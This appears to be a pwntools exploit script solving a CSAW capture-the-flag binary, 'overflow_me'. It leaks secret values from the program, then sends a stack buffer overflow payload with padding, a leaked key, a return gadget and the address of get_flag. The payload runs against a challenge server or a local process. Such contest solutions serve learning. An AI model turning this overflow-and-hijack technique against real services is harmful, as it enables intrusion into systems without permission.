from pwn import *

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./overflow_me", checksec=False)

context.binary = exe

serv = "chals.ctf.csaw.io"
port = 21006

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        cmd = [exe.path]
        r = process(cmd)
        if args.GDB:
            gdb.attach(r, gdbscript="""
            """)
    return r

r = conn()

def main():

    sna(b'address\n', p64(exe.sym.secret_key))
    key1 = int(b'0x' + rcl().strip(), 16)
    log.info(f"{key1=}")

    sna(b'unlocks\n', p64(key1))

    rcu(b'you: ')
    key2 = int(rcl().strip(), 16)
    log.info(f"{key2=}")

    ret_gadget = 0x401423
    sla(b'story.\n', b'A' * 0x40 + p64(key2) + b'A' * 0x10 + p64(ret_gadget) + p64(exe.sym.get_flag))
    
    r.interactive()

if __name__ == "__main__":
    main()